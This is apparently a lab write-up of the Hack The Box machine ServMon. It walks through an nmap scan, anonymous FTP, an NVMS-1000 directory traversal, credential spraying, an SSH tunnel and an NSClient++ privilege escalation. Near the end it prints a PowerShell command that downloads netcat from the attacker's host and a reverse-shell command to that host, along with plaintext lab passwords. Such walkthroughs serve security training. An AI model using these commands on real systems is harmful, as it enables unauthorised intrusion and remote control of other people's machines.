---
icon: windows
---

# ServMon - Easy

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/servmon"><strong>ServMon</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.184 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 14:12 EST
Nmap scan report for 10.10.10.184
Host is up (0.049s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  06:35PM       <DIR>          Users
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";                                                                                                     
|     </script>                                                                                                                                     
|     </head>                                                                                                                                       
|     <body>                                                                                                                                        
|     </body>                                                                                                                                       
|     </html>                                                                                                                                       
|   NULL:                                                                                                                                           
|     HTTP/1.1 408 Request Timeout                                                                                                                  
|     Content-type: text/html                                                                                                                       
|     Content-Length: 0                                                                                                                             
|     Connection: close                                                                                                                             
|_    AuthInfo:                                                                                                                                     
|_http-title: Site doesn't have a title (text/html).                                                                                                
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                 
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                         
445/tcp   open  microsoft-ds?                                                                                                                       
5666/tcp  open  tcpwrapped                                                                                                                          
6063/tcp  open  tcpwrapped                                                                                                                          
6699/tcp  open  tcpwrapped                                                                                                                          
8443/tcp  open  ssl/https-alt                                                                                                                       
| http-title: NSClient++                                                                                                                            
|_Requested resource was /index.html                                                                                                                
|_ssl-date: TLS randomness does not represent time                                                                                                  
| ssl-cert: Subject: commonName=localhost                                                                                                           
| Not valid before: 2020-01-14T13:24:20                                                                                                             
|_Not valid after:  2021-01-13T13:24:20                                                                                                             
| fingerprint-strings:                                                                                                                              
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:                                                                                        
|     HTTP/1.1 404                                                                                                                                  
|     Content-Length: 18                                                                                                                            
|     Document not found                                                                                                                            
|   GetRequest:                                                                                                                                     
|     HTTP/1.1 302                                                                                                                                  
|     Content-Length: 0                                                                                                                             
|     Location: /index.html                                                                                                                         
|     workers                                                                                                                                       
|_    jobs                                                                                                                                          
49664/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49665/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49666/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49667/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.95%I=7%D=11/29%Time=692B45BA%P=x86_64-pc-linux-gnu%r(NUL
SF:L,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/h
SF:tml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20te
SF:xt/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\
SF:x20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20
SF:XHTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/
SF:DTD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\
SF:.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20
SF:\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x
SF:20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n"
SF:)%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r
SF:\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML
SF:\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/x
SF:html1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/
SF:1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\
SF:x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x2
SF:0\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(R
SF:TSPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\
SF:nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\
SF:n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201
SF:\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1
SF:-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/
SF:xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x
SF:20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20
SF:\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=11/29%Time=692B45C2%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocatio
SF:n:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x
SF:18\x0c\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\
SF:x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\
SF:.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(
SF:RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocume
SF:nt\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Lengt
SF:h:\x2018\r\n\r\nDocument\x20not\x20found");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/29%OT=21%CT=1%CU=40325%PV=Y%DS=2%DC=T%G=Y%TM=692B46
OS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS
OS:=U)SEQ(SP=102%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=103%GCD=1%IS
OS:R=10E%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%II=I%S
OS:S=S%TS=U)SEQ(SP=106%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M542NW
OS:8NNS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)WIN
OS:(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFF
OS:F%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%
OS:RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 1s
| smb2-time: 
|   date: 2025-11-29T19:15:03
|_  start_date: N/A
```

### <mark style="color:$primary;">FTP 21 TCP</mark>

Allows for anonymous access I'll download everything and take a look at it

```shellscript
wget -r ftp://anonymous:@10.10.10.184
```

There are 2 files:

{% code title="Confidential.txt" %}
```shellscript
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```
{% endcode %}

{% code title="Notes to do.txt" %}
```shellscript
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
{% endcode %}

We know that there is a Password.txt file on Nathan's Desktop!&#x20;

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Visiting the site we see NVMS-1000. Let's see if there are any exploits available for it.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Searchsploit reveals a Directory Traversal exploit! I'll download the txt file and check it

```shellscript
searchsploit -m 47774
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I'll try the request in Burp Suite! And it works!

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Earlier we discovered that there is a passwords.txt file located on Nathan's desktop. I’ll use the directory traversal vulnerability to try to read that file

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nice we got some passwords and we have 2 users let's do some credential spraying and see if we get any matches:

### <mark style="color:$primary;">Credential Spraying</mark>

```shellscript
netexec smb $ip -u users -p passwords --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We found nadine's password!

Since SSH is on this box let's give it a shot!

### <mark style="color:$primary;">SSH -> Nadine</mark>

```shellscript
ssh nadine@10.10.10.184
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">HTTP Port 8443</mark>

Wone be able to get the website working until we setup a tunnel

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

But this will be a NSClient++ a quick google search reveals a privilege escalation exploit

{% embed url="https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation" %}

Keep this in mind we are going to use this exploit later on first we need a couple of things

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We got the password we will need for the exploit now let's setup a tunnel to the application on the system

### <mark style="color:$primary;">Setup Tunnel via ssh</mark>

{% code overflow="wrap" %}
```shellscript
sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```
{% endcode %}

After running this command you shoule be able to see the site at <mark style="color:green;">**https://127.0.0.1:8443**</mark>

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

For the password use the one we discovered in the config file

```
ew2x6SsGTxjRwXOT
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To get the github exploit working now:

<mark style="color:yellow;">**First step:**</mark> upload nc.exe on the machine&#x20;

```shellscript
powershell iwr http://10.10.16.2/nc64.exe -outfile nc.exe
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**Second step**</mark> run the exploit with a nc listener on port 9001

{% code overflow="wrap" %}
```shellscript
python exploit.py "C:\\Users\\Nadine\\nc.exe 10.10.16.2 9001 -e cmd.exe" https://127.0.0.1:8443 ew2x6SsGTxjRwXOT
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
